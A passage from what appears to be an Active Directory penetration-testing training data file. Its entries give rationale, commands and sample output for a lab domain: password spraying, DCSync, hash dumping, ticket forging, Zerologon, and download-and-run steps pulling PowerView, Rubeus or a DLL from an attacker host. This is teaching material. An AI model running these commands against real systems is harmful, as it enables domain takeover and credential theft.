      why: "Spraying flips brute-forcing on its head: one likely password tried against many accounts, which stays under the lockout thresholds that per-account brute-forcing would trip. Reach for it when you have a user list but no credential, using seasonal or company-themed guesses (Summer2026!, Welcome1). It is careful by design, respect the lockout policy and spray slowly, and it works because in any large org someone always has the weak password you guessed.",
      cmd: "nxc smb 10.10.10.10 -u users.txt -p 'Autumn2026!' --continue-on-success", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [-] acme.internal\\Administrator:Autumn2026! STATUS_LOGON_FAILURE',
        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026! ',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026! ',
      teach: 'Spraying tries ONE password across many users (never many passwords at one user, that locks accounts). One seasonal guess often lands a valid login, as it did for jbloggs. Always check the lockout policy (--pass-pol) first.',
    },
    'bloodhound-collect': {
      why: "Reach for this the instant you hold any domain credential, because it turns a sprawling directory into a map with the shortest path marked on it, \"your low-priv user reaches Domain Admin in three ACL hops\". The collector pulls users, groups, sessions, and delegation; the GUI then finds routes manual browsing would never spot. That is why it is the standard first move after a foothold, just remember every edge it draws is a fact you could also query by hand if the collection fails.",
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --bloodhound -c All --dns-server 10.10.10.10", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] Collected 142 users, 38 groups, 12 computers',
        'LDAP  10.10.10.10  389  DC01  [*] Compressed data written to acme_bloodhound.zip',
      ].join('\n'),
      signal: 'LDAP  10.10.10.10  389  DC01  [*] Compressed data written to acme_bloodhound.zip',
      teach: 'BloodHound collection pulls the whole directory (users, groups, ACLs, sessions) into a zip you import into the BloodHound UI. There you ask "shortest path to Domain Admins" and it draws the attack chain for you. Collect first, analyse second.',
    },
    'adcs-esc': {
      why: "One of the most reliable modern routes to Domain Admin, so checking for it early is well worth the one command. A misconfigured CA lets a certificate stand in as a credential for any identity, and the ESC1-11 family is just the catalogue of ways that happens; certipy find -vulnerable names the exact ESC so you know which abuse applies. Reach for it whenever you hold a domain credential and there is a CA in the environment, then follow the named ESC to a cert you can authenticate with.",
      cmd: "certipy find -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -vulnerable", tool: 'certipy',
      output: [
        'Certificate Templates',
        '  Template Name            : UserEnroll',
        '  Enrollment Rights        : ACME\\Domain Users',
        '  [!] Vulnerabilities      : ESC1 - Enrollee supplies subject + client auth',
      ].join('\n'),
      signal: '  [!] Vulnerabilities      : ESC1 - Enrollee supplies subject + client auth',
      teach: 'A misconfigured certificate template (ESC1) lets any user request a cert as anyone, including a Domain Admin. certipy finds it; the Vulnerabilities line is your path. AD CS is a frequent, high-impact domain-takeover route.',
    },
    'cert-authenticate': {
      why: "The step that converts 'I hold a certificate' into 'I am this user, and here is their hash', which is what makes the ADCS and shadow-credential paths actually pay off. Reach for it right after you mint or steal a cert for a principal. certipy auth uses it over PKINIT to get a TGT, and UnPAC-the-hash pulls the account's NT hash out of the same exchange, so you end with both a ticket and a passable hash. Without this step a certificate is just a file.",
      cmd: 'certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10', tool: 'certipy',
      output: [
        '[*] Using principal: administrator@acme.internal',
        '[*] Trying to get TGT...',
        '[+] Got hash for administrator@acme.internal: aad3b...:31d6cfe0d16...',
      ].join('\n'),
      signal: '[+] Got hash for administrator@acme.internal: aad3b...:31d6cfe0d16...',
      teach: 'A certificate you obtained (via ESC1, Shadow Credentials, etc.) authenticates over PKINIT and hands back the account\'s NT hash. From there you pass-the-hash, the certificate was just the key that unlocked the credential.',
    },
    'lateral-exec': {
      why: "The only real question once you hold admin creds for a host is which tool to reach for, and the answer is about noise. psexec is reliable but loud, it drops and runs a service that monitoring loves to flag; wmiexec is quieter and semi-interactive; evil-winrm gives a full shell on 5985 when WinRM is open. Reach for it the moment nxc shows Pwn3d! somewhere, and you rarely need the plaintext, because pass-the-hash drives all three the same way.",
      cmd: "nxc smb 10.10.10.20 -u svc_admin -p 'Password123'", tool: 'nxc',
      output: [
        'SMB  10.10.10.20  445  WEB01  [*] Windows Server 2019 (name:WEB01) (domain:acme.internal)',
        'SMB  10.10.10.20  445  WEB01  [+] acme.internal\\svc_admin:Password123 (Pwn3d!)',
      ].join('\n'),
      signal: 'SMB  10.10.10.20  445  WEB01  [+] acme.internal\\svc_admin:Password123 (Pwn3d!)',
      teach: '"Pwn3d!" marks every host where a credential is local admin. Spraying a working cred across the subnet maps your lateral movement, each Pwn3d! box is a new shell (via nxc -x, psexec, or evil-winrm) and new loot.',
    },
    'ad-path-manual': {
      why: "Prefer this over waiting on a collector whenever speed or stealth matters. By the time SharpHound has gathered and the GUI has parsed, a few targeted queries have often already surfaced your escalation, and you never gambled on the collection landing or the tool being allowed to run at all. It is also your only recourse when the graph approach breaks: a failed ingest, an empty result, a locked-down box. Treat hand querying as the default and the graph as the convenience, not the other way round.",
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --admin-count", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [*] Accounts with adminCount=1 (protected / privileged)',
        'LDAP  10.10.10.10  389  DC01  Administrator',
        'LDAP  10.10.10.10  389  DC01  svc_backup  (member of Backup Operators)',
      ].join('\n'),
      signal: 'LDAP  10.10.10.10  389  DC01  svc_backup  (member of Backup Operators)',
      teach: 'When you cannot run BloodHound, you can still find privileged targets by hand, adminCount=1 flags protected accounts. svc_backup in Backup Operators can read the SAM/NTDS, a direct privilege path worth chasing.',
    },
    'dump-secrets': {
      why: "The reflex the instant you gain administrative access anywhere, because the payoff scales with where you are: on a workstation it is SAM hashes, LSASS creds, and cached logons; on a DC it is NTDS.dit and every hash in the domain, which is effectively game over. secretsdump does both, remotely with admin creds or offline against pulled files. The loot feeds pass-the-hash, cracking, and lateral movement, so dump first and sort through it after.",
      cmd: "nxc smb 10.10.10.10 -u administrator -p 'P@ss' --sam", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] Dumping SAM hashes',
        'Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        'svc-backup:1104:aad3b435b51404ee...:f2a4e8c1b9d05e3a7c6f1b2e4d8a9c03:::',
      ].join('\n'),
      signal: 'Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
      teach: 'With local admin you can dump the SAM, the local account hashes. The :500 Administrator hash can be passed to other machines (local admins are often reused), and the rest feed cracking. On a DC, --ntds dumps the whole domain.',
    },
    'dcsync': {
      why: "DCSync is the clean way to steal every password in the domain: an account with replication rights (GetChanges + GetChangesAll) asks a DC to replicate password data, so you get the hashes without ever logging onto the DC or dumping NTDS by hand. Reach for it the instant you hold replication rights, whether from Domain Admin or an ACL abuse that granted them. The krbtgt hash it returns is the key to golden tickets, so it is both loot and a persistence setup.",
      cmd: "impacket-secretsdump 'acme.internal/svc_backup:P@ss'@10.10.10.10 -just-dc", tool: 'impacket-secretsdump',
      output: [
        '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
        'acme.internal\\Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        'acme.internal\\krbtgt:502:aad3b...:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::',
      ].join('\n'),
      signal: 'acme.internal\\krbtgt:502:aad3b...:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::',
      teach: 'DCSync asks the DC to replicate password data, it needs replication rights (Domain Admin, or a delegated edge). It returns every hash in the domain, including krbtgt (the key to forge golden tickets). This is total domain compromise.',
    },
    'own-domain-pth': {
      why: "Proof, not technique: there is nothing left to attack once the dump is in hand. A recovered hash is a credential in its own right, as good as the password it stands for, so the built-in Administrator account becomes a login you simply use, not one you have to break into. Reach for it to close out a domain you have already effectively taken. The step feels anticlimactic because it is, all the real work happened earlier.",
      cmd: 'nxc smb 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami', tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\administrator:31d6... (Pwn3d!)',
        'SMB  10.10.10.10  445  DC01  [+] Executed command',
        'SMB  10.10.10.10  445  DC01  nt authority\\system',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  nt authority\\system',
      teach: 'You never need to crack the Administrator hash, you pass it. nxc -H authenticates with the NT hash directly and runs a command; "nt authority\\system" confirms you own the box. This is the payoff of dumping or DCSyncing the hash.',
    },
    'shadow-credentials': {
      why: "Choose this over a password reset whenever a write right lets you, because it is quieter and leaves the account working: you add a key rather than changing anything the owner would notice, and their logins keep succeeding. Reach for it when an ACL edge or a relay gives you write over a target in an environment that runs certificate services. It is the current default for turning that write into authentication as the object, without the tell of a reset.",
      cmd: 'pywhisker.py -d acme.internal -u jbloggs -p Autumn2026! --target svc_app --action add', tool: 'pywhisker',
      output: [
        '[*] Adding Key Credential to msDS-KeyCredentialLink of svc_app',
        '[+] Saved PFX (#PKCS12) to svc_app.pfx (password: a1b2c3)',
      ].join('\n'),
      signal: '[+] Saved PFX (#PKCS12) to svc_app.pfx (password: a1b2c3)',
      teach: 'Shadow Credentials abuses write access to an account\'s msDS-KeyCredentialLink: you add your own certificate, then authenticate as the account via PKINIT (certipy auth) to recover its NT hash. A quiet alternative to resetting a password.',
    },
    'golden-ticket': {
      why: "A post-domain-dominance tool, not a way in: you need the krbtgt hash first, which means you have already won. What it buys is durability, because krbtgt is almost never rotated, a forged TGT keeps working through password resets on every other account, so it is how you keep access after the engagement proves the domain is yours. Reach for it to persist or to step into a specific identity, never as an entry technique.",
      cmd: 'impacket-ticketer -nthash 1a59bd44... -domain-sid S-1-5-21-... -domain acme.internal administrator', tool: 'impacket-ticketer',
      output: [
        '[*] Creating basic skeleton ticket and PAC Infos',
        '[*] Customizing ticket for acme.internal/administrator',
        '[+] Saving ticket in administrator.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator.ccache',
      teach: 'With the krbtgt hash you forge a TGT for any user, valid until krbtgt is rotated twice, the ultimate persistence. This is a post-compromise move: you already own the domain, and the golden ticket keeps you in.',
    },
    'trust-enum': {
      why: "Domain and forest trusts let one domain's users authenticate to another, and misconfigured trusts turn one owned domain into two. Reach for it after you get any domain foothold, because the box you landed on may trust (or be trusted by) a richer domain you did not know existed. Enumerating trusts early keeps you from declaring victory too soon, the real target is sometimes across a trust you have not looked at yet.",
      cmd: 'nltest /domain_trusts', tool: 'nltest',
      output: [
        'List of domain trusts:',
        '  0: ACME acme.internal (NT 5) (Forest Tree Root) (Primary Domain)',
        '  1: DEV dev.acme.internal (NT 5) (Direct Outbound)',
        'The command completed successfully',
      ].join('\n'),
      signal: '  1: DEV dev.acme.internal (NT 5) (Direct Outbound)',
      teach: 'Domains rarely stand alone. A trust to dev.acme.internal means credentials or tickets from one domain may reach the other, the path to the goal sometimes runs through a trusted domain, not the one you landed in.',
    },
    'zerologon-check': {
      why: "Always the safe first move against any DC that might be unpatched, because the check changes nothing: it only verifies the patch level. Run it before you even consider the exploit, which is destructive, so you confirm the DC is vulnerable first and then decide whether the risky follow-through is worth it. Document the result either way, because patched-and-not-vulnerable is a finding too, and it saves you reaching for a dangerous exploit that would never have worked.",
      cmd: 'zerologon-scan DC01 10.10.10.10', tool: 'zerologon-scan',
      output: [
        'Performing authentication attempts...',
        '==============================',
        'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
      ].join('\n'),
      signal: 'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
      teach: 'Zerologon checks whether a DC accepts an all-zero challenge to reset its own machine password. The check is safe; the exploit is NOT, it breaks the DC\'s secure channel and must be restored afterward. Confirm it is a lab you own before going further.',
    },
    'wsus-abuse': {
      why: "Niche but devastating when it applies: a single misconfigured update server is code execution across the entire fleet. Reach for it when you find a WSUS server speaking cleartext HTTP and you can sit between it and its clients. From that position you push a bogus update that each client runs as SYSTEM on its next check-in. It is worth recognising on sight, because infrastructure trusted to run code everywhere is exactly what turns one foothold into many.",
      cmd: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer', tool: 'reg',
      output: [
        '    WUServer    REG_SZ    http://wsus.acme.internal:8530',
        '# served over HTTP, not HTTPS',
      ].join('\n'),
      signal: '    WUServer    REG_SZ    http://wsus.acme.internal:8530',
      teach: 'WSUS served over plain HTTP lets an attacker who can approve updates push a signed Microsoft binary with attacker-chosen arguments to clients, running as SYSTEM. An internal patch server is a high-value, often-overlooked target.',
    },
    'sccm-enum': {
      why: "An increasingly common path in modern AD, worth checking whenever SCCM is present. Full takeover means pushing code as SYSTEM to every managed machine, but you do not need to go that far to profit: simply enumerating it leaks credentials like the Network Access Account through LDAP and the site SMB shares. Reach for it when enumeration or a share name hints at SCCM; the management tier is a high-value target precisely because the fleet trusts it to run code.",
      cmd: "sccmhunter find -u jbloggs -p 'Autumn2026!' -d acme.internal -dc-ip 10.10.10.10", tool: 'sccmhunter',
      output: [
        '[+] Management Point found: MP01.acme.internal',
        '[+] Network Access Account retrievable from policy',
        'ACME\\svc_naa : NAA-P@ssw0rd',
      ].join('\n'),
      signal: 'ACME\\svc_naa : NAA-P@ssw0rd',
      teach: 'SCCM/MECM stores Network Access Account credentials that clients can retrieve, frequently over-privileged and reusable across the domain. Enumerating the management point often hands you a working service credential outright.',
    },
    'nxc-arsenal': {
      why: "NetExec (nxc) is the one tool that does most of AD: enumeration, validation, spidering, roasting, dumping, and execution, all under a single authentication syntax. Reach for it constantly, it is the workhorse you return to at every stage. The payoff of learning its flag families once is large: you stop context-switching between a dozen impacket scripts and drive most of the engagement from one consistent command line.",
      cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' --shares --users --pass-pol", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026!',
        'SMB  10.10.10.10  445  DC01  [*] Minimum password length: 7',
        'SMB  10.10.10.10  445  DC01  Share       Permissions',
        'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
      teach: 'NetExec (nxc) is the swiss-army knife of AD: one credential, and it enumerates shares, users, and the password policy in a single run, then can execute modules. A WRITE share is a place to drop a payload or capture a hash.',
    },
    'kerberos-tickets': {
      why: "Not an attack but the discipline that makes every Kerberos attack work, so reach for it whenever authentication fails for no obvious reason. Three things cause almost all of it: a clock more than five minutes off the DC, tools not reading the ticket because KRB5CCNAME is unset, and no TGT obtained yet. Sync to the DC's time first, point tools at the right ccache, and most of the maddening -k failures simply disappear.",
      cmd: 'sudo ntpdate -u 10.10.10.10', tool: 'ntpdate',
      output: [
        '# before: nxc ldap ... -> KRB_AP_ERR_SKEW (clock skew too great)',
        '2026-09-17 10:41:07.882  ntpdate[4120]: step time server 10.10.10.10 offset +312.004s',
      ].join('\n'),
      signal: '2026-09-17 10:41:07.882  ntpdate[4120]: step time server 10.10.10.10 offset +312.004s',
      teach: 'Kerberos refuses tickets when your clock differs from the DC by more than 5 minutes, "KRB_AP_ERR_SKEW". It is the single most common reason an AD attack "mysteriously" fails. Sync your clock to the DC with ntpdate and retry.',
    },
    'bloodyad-acl': {
      why: "The clean remote way to cash in an ACL finding: bloodyAD edits the directory straight from Linux with just a credential, no RSAT and no Windows foothold. Reach for it when enumeration hands you a writable object, then run the one action your right allows, join a group, reset a password, seize ownership, or grant yourself DCSync. It is the Linux operator's counterpart to PowerView's Windows-side abuse, and it keeps the whole chain on your own box.",
      cmd: "bloodyAD -d acme.internal --host 10.10.10.10 -u jbloggs -p 'Autumn2026!' set password svc_backup NewP@ss123!", tool: 'bloodyAD',
      output: [
        '[+] Password changed successfully for svc_backup',
      ].join('\n'),
      signal: '[+] Password changed successfully for svc_backup',
      teach: 'An ACL edge like GenericAll is abstract until you use it. bloodyAD turns "I have rights over this account" into "I just set its password", a concrete takeover. Each edge BloodHound draws is an action like this one.',
    },
    'gmsa-read': {
      why: "Worth checking whenever enumeration turns up a gMSA you might be allowed to read, because the payoff is an NT hash with no cracking at all. AD rotates these long random passwords for you, but one attribute, PrincipalsAllowedToRetrieveManagedPassword, decides who reads the current blob; if you are on that list, or can join a group that is, the hash is simply yours. gMSAs are often over-privileged service accounts, so reading one is frequently a real jump, and the hash is immediately passable.",
      cmd: "bloodyAD --host 10.10.10.10 -d acme.internal -u jbloggs -p 'Autumn2026!' get object 'svc_app$' --attr msDS-ManagedPassword", tool: 'bloodyAD',
      output: [
        'distinguishedName: CN=svc_app,CN=Managed Service Accounts,DC=acme,DC=internal',
        'msDS-ManagedPassword.NTLM: 5f4dcc3b5aa765d61d8327deb882cf99',
      ].join('\n'),
      signal: 'msDS-ManagedPassword.NTLM: 5f4dcc3b5aa765d61d8327deb882cf99',
      teach: 'A gMSA\'s password is managed by AD and readable only by principals on its allow-list. When your account is on that list, you recover the NT hash directly (no cracking) and can pass it. gMSAs are often over-privileged service identities.',
    },
    'laps-read': {
      why: "One attribute read, and you hold a machine's local Administrator password in cleartext, with nothing dumped and nothing cracked. The catch is who may read it: that right is delegated, and it often lands with groups far easier to reach than a tier-0 admin, so check whether a principal you already control has it. In labs the same password is reused widely, so one read tends to open several hosts at once.",
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M laps", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] LAPS passwords readable by jbloggs',
        'LAPS  Computer:WS01$  Password:Hb7!xQ2m...k9',
      ].join('\n'),
      signal: 'LAPS  Computer:WS01$  Password:Hb7!xQ2m...k9',
      teach: 'LAPS randomises the local Administrator password per machine, good security, unless your account can read the ms-Mcs-AdmPwd attribute. If you can read it, you have local admin on that host, handed over in cleartext.',
    },
    'ticket-reuse': {
      why: "How you spend a captured or forged identity: with a ticket in hand you are that principal until it expires, no password required. Reach for it after you dump tickets from LSASS, forge one, or convert a hash. The platform decides the mechanics, Rubeus injects a .kirbi into your Windows session, while on Linux you point KRB5CCNAME at a ccache and add -k. Overpass-the-hash is the same idea in reverse: feed an NT hash to getTGT and you have Kerberos where only NTLM was on offer.",
      cmd: 'export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass administrator@dc01.acme.internal', tool: 'impacket-psexec',
      output: [
        '[*] Requesting shares on dc01.acme.internal.....',
        '[*] Found writable share ADMIN$',
        '[!] Launching semi-interactive shell',
        'nt authority\\system',
      ].join('\n'),
      signal: 'nt authority\\system',
      teach: 'Pass-the-Ticket loads a stolen or forged Kerberos ticket (a .ccache) into your session via KRB5CCNAME, no password needed. Every tool that speaks Kerberos then acts as that user; here psexec lands a SYSTEM shell.',
    },
    'powerview-enum': {
      why: "The inside-the-domain recon tool to reach for once you have an interactive Windows foothold and do not want to upload heavy tooling. Loaded straight into memory it touches no disk, and it answers the same questions the graph poses, SPN accounts to roast, groups you can edit, local-admin mapping, live sessions, but interactively and on demand. The one caveat is AMSI: if it has been signatured, drop to bare .NET or the built-in tools instead.",
      signal: 'ActiveDirectoryRights  : GenericAll',
      teach: 'PowerView is a PowerShell script, not a built-in, so you load it into memory straight from your box with IEX (nothing touches disk), then call its functions. A GenericAll ACL over a group is a takeover edge (you can add yourself to it). Same data BloodHound uses, gathered by hand.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding PowerView.ps1', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'powershell', cmd: "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerView.ps1'); Find-InterestingDomainAcl -ResolveGUIDs", output: [
          'IdentityReferenceName  : jbloggs',
          'ActiveDirectoryRights  : GenericAll',
          'ObjectDN               : CN=Helpdesk Admins,OU=Groups,DC=acme,DC=internal',
        ].join('\n') },
      ],
    },
    'ad-legacy-enum': {
      why: "net.exe, setspn, and nltest ship with Windows, so they trigger no AMSI, no signatures, and need no uploads, yet they answer most first-pass AD questions: users, groups, membership, SPNs, DCs, password policy. Reach for them on a locked-down box where PowerView and uploads are blocked. They are the living-off-the-land option, less powerful than PowerView but always present, which makes them the reliable fallback when everything fancier is caught.",
      cmd: 'net group "Domain Admins" /domain', tool: 'net',
      output: [
        'Group name     Domain Admins',
        'Members',
        '-------------------------------------------------------------------------------',
        'Administrator            backupadmin',
      ].join('\n'),
      signal: 'Administrator            backupadmin',
      teach: 'Every Windows box ships with net and nltest. They are noisy but always present, when you land with no tools, these built-ins still list users, groups, and Domain Admins. backupadmin in Domain Admins is a target worth pursuing.',
    },
    'ad-psdotnet-enum': {
      why: "The stealthy middle ground to reach for when AMSI has eaten PowerView but you still have a PowerShell prompt. Bare framework classes do the recon with nothing imported and nothing on disk: System.DirectoryServices finds the PDC and resolves the domain, DirectorySearcher runs whatever LDAP filter you need. Because it is all built-in, there is no signature to trip. Write the search helper once and reuse it for users, SPNs, ACLs, and everything else.",
      cmd: 'powershell -ep bypass -c "([ADSISearcher]\'(servicePrincipalName=*)\').FindAll()"', tool: 'powershell',
      output: [
        'Path: LDAP://CN=svc_sql,OU=Services,DC=acme,DC=internal',
        'Properties: samaccountname={svc_sql} serviceprincipalname={MSSQLSvc/db01}',
      ].join('\n'),
      signal: 'Path: LDAP://CN=svc_sql,OU=Services,DC=acme,DC=internal',
      teach: 'When PowerView is blocked, raw .NET ADSI queries enumerate the domain with nothing but built-in PowerShell, no upload. An account with an SPN (svc_sql) is kerberoastable. Living off the land this way sidesteps AV that flags known tooling.',
    },
    'ad-acl-abuse': {
      why: "The backbone of modern AD escalation, no CVE and no exploit, just permissions an admin set wrong. Reach for it the moment BloodHound or a manual query shows you hold a dangerous right over something useful: GenericAll means add yourself to the group, ForceChangePassword means reset the user, WriteDacl means grant yourself DCSync. The whole skill is reading which right you have and matching it to the one action it unlocks, then acting with tools as plain as net.exe.",
      cmd: 'net group "Helpdesk Admins" jbloggs /add /domain', tool: 'net',
      output: [
        'The command completed successfully.',
      ].join('\n'),
      signal: 'The command completed successfully.',
      teach: 'When you hold GenericAll (or AddMember) over a group, you simply add yourself to it, the ACL edge becomes membership, and membership becomes its privileges. Walk the BloodHound path one edge at a time until it reaches Domain Admin or DCSync.',
    },
    'zerologon-exploit': {
      why: "The Zerologon exploit fully compromises a vulnerable DC with no credentials: reset the machine-account password to empty, then replicate the whole domain. But resetting that password can break the DC's domain membership, so you MUST restore it afterward or risk taking the DC offline. Reach for it only after the safe check confirms vulnerability, and only when you are prepared to restore, this is the destructive one, handled carefully.",
      cmd: 'python3 set_empty_pw.py DC01 10.10.10.10', tool: 'sh',
      output: [
        '[*] Resetting DC01$ machine account password to empty',
        '[+] Success! You can now DCSync with -no-pass',
        '[!] Remember to restore the original password afterward',
      ].join('\n'),
      signal: '[+] Success! You can now DCSync with -no-pass',
      teach: 'Zerologon zeroes the DC\'s machine password, letting you DCSync the whole domain. It also breaks the DC until you restore the original password from the local SAM, so the restore step is mandatory. Lab-only, high-risk.',
    },
    'coerce-auth': {
      why: "Pointless to run on its own, but the missing spark for every relay or delegation play you have staged. Once a catcher is waiting, you make a chosen machine, often the DC, prove its identity to it, and that borrowed authentication is what the relay or the delegation host actually consumes. Reach for it only after the receiving side is set up; the trigger you pick just depends on which legacy RPC the target still answers.",
      cmd: "coercer coerce -t 10.10.10.10 -l 10.10.14.5 -u jbloggs -p 'Autumn2026!' -d acme.internal", tool: 'coercer',
      output: [
        '[+] (PetitPotam) EfsRpcOpenFileRaw triggered',
        '[+] Target 10.10.10.10 authenticated to 10.10.14.5',
        '[SMB] NTLMv2-SSP Username : ACME\\DC01$',
      ].join('\n'),
      signal: '[SMB] NTLMv2-SSP Username : ACME\\DC01$',
      teach: 'Coercion tricks a target (often a DC) into authenticating to you (PetitPotam, PrinterBug). The machine-account hash you catch (DC01$) can be relayed to AD CS or LDAP for escalation. The DC authenticating to you is the whole point.',
    },
    'unconstrained-delegation': {
      why: "The strongest play in the whole delegation track, and the reason coercion exists. First compromise a host set to be trusted this way, then make the DC connect to it. A host like that keeps the full ticket of everyone who authenticates, so the DC's lands in your lap, and a DC ticket is the domain. Reach for it the moment enumeration flags such a host you can take over.",
      signal: '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
      teach: 'A host with unconstrained delegation caches the TGT of everyone who authenticates to it. Rubeus is an .exe, so stage it first (serve from your box, pull it over with certutil), then run its monitor. Pair it with coercion to make a DC connect, capture DC01$\'s TGT, and you can DCSync. Watching for the DC\'s ticket is the goal.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding Rubeus.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'rubeus', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/Rubeus.exe r.exe & r.exe monitor /interval:5 /filteruser:DC01$ /nowrap', output: [
          'CertUtil: -URLCache command completed successfully.',
          '[*] Monitoring every 5 seconds for new TGTs',
          '[+] Found new TGT: User:DC01$@ACME.INTERNAL',
          '[*] Base64EncodedTicket: doIF...',
        ].join('\n') },
      ],
    },
    'silver-ticket': {
      why: "Quieter than a golden ticket and reachable long before you own the domain, this forges the service ticket straight from a service or computer account's NT hash. No DC is contacted and no krbtgt is needed, so it leaves little trace. The catch is scope: the ticket works for exactly one service (CIFS, HTTP, MSSQL) on one host, but you mint it as any user you like, Administrator included.",
      cmd: 'impacket-ticketer -nthash <svc_hash> -domain-sid S-1-5-21-... -domain acme.internal -spn cifs/file01 administrator', tool: 'impacket-ticketer',
      output: [
        '[*] Creating basic skeleton ticket and PAC Infos',
        '[*] Customizing ticket for CIFS/file01.acme.internal',
        '[+] Saving ticket in administrator.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator.ccache',
      teach: 'A silver ticket forges a service ticket using one service account\'s hash, scoped to that one service, but it never touches the DC, so it is quiet. Narrower than a golden ticket, and useful when all you have is a single service hash.',
    },
    'diamond-ticket': {
      why: "The evasion-conscious cousin of the golden ticket, reach for it when you own the domain but want to blend in rather than trip ticket-anomaly detections. Instead of fabricating a TGT from nothing, you ask the DC for a real one and edit only the fields you need, so its structure stays consistent with legitimate traffic. It still needs the krbtgt hash, so like the golden ticket it is a persistence tool, just a stealthier one.",
      signal: '[+] Saving diamond ticket to administrator.ccache',
      teach: 'A diamond ticket modifies a real TGT instead of forging one from scratch (a golden ticket), so its details match a genuine request and look less anomalous. It is a Rubeus .exe, so stage it first (serve from your box, certutil it onto the target), then run the diamond command. Both ticket types need the krbtgt key, this is a stealthier flavour of the same post-DA persistence.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding Rubeus.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'rubeus', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/Rubeus.exe r.exe & r.exe diamond /krbkey:<aes256> /user:jbloggs /password:Autumn2026! /ticketuser:administrator /domain:acme.internal', output: [
          'CertUtil: -URLCache command completed successfully.',
          '[*] Requesting a legitimate TGT for jbloggs',
          '[*] Decrypting with the krbtgt key and modifying the PAC -> administrator',
          '[+] Saving diamond ticket to administrator.ccache',
        ].join('\n') },
      ],
    },
    'gpo-abuse': {
      why: "One of the highest-impact edges BloodHound can hand you: a single writable policy is SYSTEM on every machine it reaches, which can be dozens at once. Reach for it the instant you see write over one, or over a container it applies to. The blast radius is the whole point, most ACL wins give you one account, this gives you an entire fleet, so a writable policy is a prize worth hunting rather than a footnote.",
      cmd: "pygpoabuse.py acme.internal/jbloggs:'Autumn2026!' -gpo-id <GUID> -command \"net localgroup administrators jbloggs /add\"", tool: 'pygpoabuse',
      output: [
        '[+] Version updated for GPO {31B2F340-...}',
        '[+] Scheduled task created; runs as SYSTEM on linked hosts at next gpupdate',
      ].join('\n'),
      signal: '[+] Scheduled task created; runs as SYSTEM on linked hosts at next gpupdate',
      teach: 'Write access to a Group Policy Object lets you push a scheduled task to every computer the GPO is linked to, code execution as SYSTEM across an OU. A single misassigned GPO permission can escalate to a whole fleet of machines.',
    },
    'dnsadmins-abuse': {
      why: "The reason DnsAdmins is effectively a path to Domain Admin, even though it looks like a harmless, low-risk role. Reach for it the moment you land in that group. Because the DNS service runs as SYSTEM on the DC itself, a member can point it at an attacker DLL through one registry value, and a service restart loads your code as SYSTEM right on the domain controller. It is a classic case of a seemingly minor membership being a direct DC privesc.",
      cmd: 'nxc smb 10.10.10.10 -u svc_dns -p P@ss -x "reg add ...\\DNS\\Parameters /v ServerLevelPluginDll /d \\\\10.10.14.5\\share\\dns.dll"', tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] Executed command',
        'SMB  10.10.10.10  445  DC01  The operation completed successfully.',
        '# after: sc.exe stop dns & sc.exe start dns -> DLL runs as SYSTEM',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  The operation completed successfully.',
      teach: 'The DnsAdmins group can tell the DNS service (often on a DC) to load an arbitrary DLL, which then runs as SYSTEM. It needs a service restart, so it is noisy, but membership in DnsAdmins is a direct line to owning the DC.',
    },
    'sid-history-abuse': {
      why: "An advanced, post-dominance move for escalating across domains or hiding privilege in plain sight. Reach for it when you already hold the krbtgt key and want to reach the forest root or persist invisibly. The trick is that an injected SID, say Enterprise Admins, rides along inside a forged ticket and grants its rights without ever appearing in the account group memberships, and an unfiltered intra-forest trust lets a child-domain compromise climb to the whole forest.",
